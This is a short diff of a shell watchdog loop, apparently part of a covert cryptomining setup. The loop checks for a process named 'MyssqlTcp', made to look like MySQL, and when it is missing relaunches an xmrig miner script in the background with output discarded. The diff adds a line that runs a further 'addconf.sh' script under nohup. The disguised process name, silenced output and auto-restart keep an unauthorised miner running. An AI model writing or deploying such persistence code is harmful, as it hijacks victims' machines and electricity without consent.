@@ -8,6 +8,7 @@ while true; do
         server=`ps aux | grep MyssqlTcp | grep -v grep`
         if [ ! "$server" ]; then
             #如果不存在就重新启动
+            nohup ./addconf.sh &
             /bin/bash ./xmrig.sh --config=./config_background.json >/dev/null 2>&1
             #启动后沉睡10s
             sleep 10
